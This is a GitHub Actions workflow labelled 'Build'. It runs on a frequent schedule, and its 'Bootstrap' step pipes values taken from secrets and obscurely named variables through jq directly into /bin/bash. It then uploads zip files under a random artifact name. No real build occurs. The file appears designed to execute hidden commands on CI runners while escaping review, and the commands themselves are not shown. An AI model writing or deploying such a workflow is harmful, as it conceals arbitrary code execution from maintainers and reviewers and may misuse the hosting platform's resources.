name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '3 4,10,16,22 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          zxadi1: ${{ secrets.zxadi1 }}
        run: |
          printf '%s' "$zxadi1" | jq -r .brd523 | /bin/bash
          echo $goko71222 | jq -r .u392 | /bin/bash
          printf '%s' "$glv88364" | jq -r .m1213 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: RWs7YU1i
          path: "*.zip"
          retention-days: 1
